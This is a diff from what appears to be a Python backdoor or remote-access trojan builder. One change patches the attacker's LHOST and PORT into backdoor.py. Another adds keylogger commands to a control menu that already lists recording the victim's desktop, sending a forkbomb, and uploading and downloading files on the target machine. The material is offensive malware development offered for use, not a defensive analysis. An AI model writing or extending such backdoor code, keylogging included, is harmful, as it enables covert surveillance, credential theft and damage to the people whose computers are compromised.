@@ -32,7 +32,7 @@ def modify_backdoor():
     file = open('backdoor.py')
     _content = file.readlines()
     for i, line in enumerate(fileinput.input('backdoor.py', inplace=1)):
-        sys.stdout.write(line.replace(_content[17], f'LHOST = "{LHOST}";PORT = {PORT}\n'))
+        sys.stdout.write(line.replace(_content[29], f'LHOST = "{LHOST}";PORT = {PORT}\n'))
     print(termcolor.colored("[+] Modifying backdoor file", 'green'))
 
 
@@ -87,6 +87,9 @@ def target_reqs():
          screen_record *on*                     # Record victim's desktop
          forkbomb                               # Send forkbomb To The Target Machine
          sysinfo                                # Get Target Machine Info
+         keylog_start                           # Start the keylog process
+         keylog_dump                            # Dump the logged keys
+         keylog_stop                            # Stop the logged keys
          cd *Dir Name*                          # Changes Directory On Target Machine
          upload *File Name*                     # Upload File To The Target Machine
          download *File name*                   # Download File From The Target Machine
